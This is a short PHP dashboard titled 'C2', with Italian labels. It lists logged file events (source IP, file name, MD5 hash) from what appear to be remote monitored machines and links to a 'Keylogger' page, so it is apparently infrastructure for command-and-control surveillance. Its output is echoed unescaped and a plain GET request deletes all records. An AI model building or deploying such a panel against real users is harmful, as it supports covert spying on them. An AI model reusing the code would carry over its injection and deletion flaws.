
<?php

include 'conf.php';
include 'db.php';

?>

<html>

<head>
<title>.:: <?php echo $title; ?> ::.</title>
<link rel="stylesheet" href="main.css">
</head>

<body>

<script>
		function myconf() {  
			var result;  
			var r = confirm("Delete?");  
			if (r == true) {  
				location.href="index.php?do=D";  
			}   
		}  
</script>

<table id="main" width="100%" cellpadding="1" cellspacing="1">
<tr>
	<td colspan="7" align="center"><h3>C2</h3></td>
</tr>

<tr>
	<td align="center">Indirizzo IP</td>
	<td align="center">Timestamp</td>
    <td align="center">ID Log</td>
	<td align="center">Nome file</td>
	<td align="center">Hash</td>
	<td>&nbsp;</td>
</tr>
<tr>
	<td colspan="7">&nbsp;</td> 
</tr>

<?php


function parsingFileName($m) {	
  $i = 5;
  $f = strpos($m, 'MD5:',0)-6; 
  return trim(substr($m,$i,$f));
}

function parsingHash($m) {
  $i = strpos($m, 'MD5:')+5;
  $f = 32; //MD5
  return trim(substr($m,$i,$f));  
}


if( isset($_REQUEST["do"]) && $_REQUEST["do"]=="D" ) {
	$sql = "DELETE FROM c2.log_monitor";
	$result = $conn->query($sql);
}

$sql = "SELECT * FROM c2.log_monitor order by timestamp DESC";
$result = $conn->query($sql);


if ($result->num_rows > 0) {
  while($row = $result->fetch_assoc()) {	
	$file_name =  $row["file_name"];
	$hash = $row["hash"];
	
	echo "<tr><td>" . $row["ip_address_source"] . "</td><td>" . $row["timestamp"] . "</td><td>" . $row["id_log"] . "</td><td>" . $file_name . "</td><td><a target='_blank' href='https://www.virustotal.com/gui/search/" . $hash . "'>" . $hash . "</a></td><td align='center'><a target='_blank' href='open.php?id=" . $row["id"] . "'>Apri</a></td></tr>";
  }
} 



 
?>

<tr>
	<td colspan="7">ID Log 169 -> Create | 269 -> Rename | 369 -> Modify</td>
</tr>
<tr>
	<td colspan="7">Record number: <?php echo $result->num_rows; ?>&nbsp;|&nbsp;<a href="index.php">Update</a>&nbsp;|&nbsp;<a href="javascript:myconf();">Delete All</a>&nbsp;|&nbsp;<a href="key.php">Keylogger</a></td>
</tr>



</table>
</body>
</html>